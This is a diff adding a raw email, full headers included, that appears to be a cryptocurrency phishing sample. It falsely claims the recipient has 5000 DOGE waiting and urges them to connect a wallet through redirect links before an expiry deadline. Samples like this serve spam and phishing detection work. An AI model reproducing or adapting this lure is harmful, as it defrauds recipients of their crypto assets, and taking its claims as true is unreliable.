@@ -1,0 +1,82 @@
+Delivered-To:
+Received: by 2002:a59:bc64:0:b0:4bf:d2e8:882f with SMTP id t4csp127355vqy;
+        Wed, 19 Mar 2025 03:04:09 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IFi3pzuAUw0lNmL57up6n6UbB6zIOejfNGAh4PX4ffWvYzCmfaWd13+0vfAHUf2oaOoSoHy
+X-Received: by 2002:a05:6102:80a6:b0:4b1:1eb5:8ee3 with SMTP id ada2fe7eead31-4c4ec84d698mr1162585137.22.1742378649426;
+        Wed, 19 Mar 2025 03:04:09 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1742378649; cv=none;
+        d=google.com; s=arc-20240605;
+        b=f5oYF93ZnBjKZ+epBt3pjdh6hoLqf3p2zBJyvPySS6VEJXqZOdAZa0S7Yz3gNeCZ/X
+         6Y/C0BJR5spyowv6PriaCzPerE0iSuiEV9MAw4GJrMPfaw20qLi2m9al5AXWr6uzmMSi
+         flEf7w4SW1Vj8gTWU9F+9Fzr++ybpqaUrNEPE1Xo8G9jZuAlrw1t9yND8iATPaIjZami
+         LBgkjAC+MazVkcEyzsXvCCuZDrqrPXvM8L03POlVQzKD4wz3qpsgTgDSF4ivNaoXEPV1
+         fIZn8meH0ByyajuLT95oKACdtLmdQ2Kr8Txyir7RhPNaO2iJkgEPsZ4y0eTFc5dopf67
+         Io9g==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=date:content-transfer-encoding:subject:to:
+         :dkim-signature:message-id;
+        bh=54SHlnwX2t0KatOOjse+znkkb67nipxBnT9ctwr1aY0=;
+        fh=CCyaa74qj7D7ZdNjnUHNPt9NlolrqMjOuj/AsYq+ZV4=;
+        b=WUx39FFPQN8hgYILq3yQ9mRMnpcCJBR6KupiIihkfjBQ/y9yCxLD0HBmwuhXJTrR1g
+         GS/oSWJmx8CNVDcyEeLJEmTLert1twaH9prMIBnZjZSsVjHiXizAJoyow+eMFTXtp2gA
+         Wd0cbARBW6rpdMPHPW+TvYXItYYNlDCsR0Eh2qsPIOq1g6DAEG9/jVnQaMvAfnCXhIfh
+         Baob0DlyeldCWYLCHlne+c4dxQkOCOHdXyhxuPpdUcGoQSeFbzohNfJq2sVAKybc7vLQ
+         xo/fyDaaB549/Sf29C4bQ5DS4KPhnuEYpw0pgBZTAgJHlCZ8hR6d3/w0vvTZhtaB6byg
+         ziqg==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@ella.fund header.s=default header.b=YClq9mtD;
+       spf=pass (google.com: domain of [removed] designates 165.140.86.72 as permitted sender) smtp.mailfrom=[removed];
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=ella.fund
+Return-Path: <[removed]>
+Received: from server.ella.fund (server.ella.fund. [165.140.86.72])
+        by mx.google.com with ESMTPS id a1e0cc1a2514c-86d90ecc688si3418742241.125.2025.03.19.03.04.09
+        for <[removed]>
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Wed, 19 Mar 2025 03:04:09 -0700 (PDT)
+Received-SPF: pass (google.com: domain of [removed] designates 165.140.86.72 as permitted sender) client-ip=165.140.86.72;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@ella.fund header.s=default header.b=YClq9mtD;
+       spf=pass (google.com: domain of [removed] designates 165.140.86.72 as permitted sender) smtp.mailfrom=[removed];
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=ella.fund
+Message-ID: <[removed]>
+X-Google-Original-Message-ID: <67da96991a5048.57343575@tcp://mail.ella.fund>
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=ella.fund;
+	s=default; h=Date:Message-Id:Content-Transfer-Encoding:Subject:To:
+	Content-Type:MIME-Version:Sender:Reply-To:
+	Resent-Date:Resent-From:
+	In-Reply-To:
+	List-Post:List-Owner:List-Archive;
+	bh=54SHlnwX2t0KatOOjse+znkkb67nipxBnT9ctwr1aY0=; b=YClq9mtDxkoONiJi1mxGdhQMC4
+	9a5TaNYoc/9jLDs0C72eiYLp43UFoJCZQBxfJwniBhXoZfy2Mkw+9gXyy9801FDHEeQVttsFq7DlF
+	Fclvam6kkM/HllDdcuyjkNGNHlSlHRDp4fhYkISucrYPAFdcYH5OBEquuFXXpKg7f3qzwg0pSUHhZ
+	yph2q3OaPl+z4oDg7RVDLMmErk0I4ngcw+kQH/MnP7ESLzKgT3rCCMQ7IU7ePbJ2XOF4yuxWGpsuI
+	2Oxu6p6Sk4bBIkTxlfbzJfAI3awfzkgtwQ0tL+hISUceCcRoYAwKusr+gJYnEGmgFs/RotKNNXfuh
+	OzoYY9mg==;
+Received: from [165.140.86.72] (port=56540 helo=dev.ella.fund)
+	by server.ella.fund with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2)
+	(envelope-from <[removed]>)
+	id 1tuqHS-00077N-25
+	for [removed];
+	Wed, 19 Mar 2025 06:04:09 -0400
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+From:
+To:
+Subject: Alert: You’ve received 5000 DOGE! (Expires at 11:59 PM today)
+Content-Transfer-Encoding: 8bit
+Date: Wed, 19 Mar 2025 10:04:09 +0000
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.ella.fund
+X-AntiAbuse: Original Domain - gmail.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - ella.fund
+X-Get-Message-Sender-Via: server.ella.fund: authenticated_id: [removed]
+X-Authenticated-Sender: server.ella.fund: [removed]
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+
+<div style='margin-bottom: 24rem'><p>         		         	                  <br>Hello (Account: [removed])                   <br><br>                  Alert: You’ve received 5000 DOGE! Connect your wallet to claim it before it expires. Only 100,000 available.                   <br><br>                   <a href=https://ella.fund/in?id=379304&email=[removed]&link=https://dogecolony.io/claim/?email=[removed]><u>Check here your wallet</u></a>                   <br><br>                                    <br>                                                          <br><br>                   Visit <a href=https://ella.fund/in?id=379304&email=[removed]&link=https://dogecolony.io/><u>dogecolony.io</u></a> now for more info!                   <br><br><br><br>                   Regards                   Support Team                   <br><br>                                                       <br><br><br><br><br><br><br><br><br><br><br><br><center><a href=https://ella.fund/in/spam.php?id=379304&email=[removed]><u><font color=red>Report Spam</u></a> | <a href=https://ella.fund/in/unsb.php?id=379304&email=[removed]><u>Unsubscribe</u></a>                   <br>
+
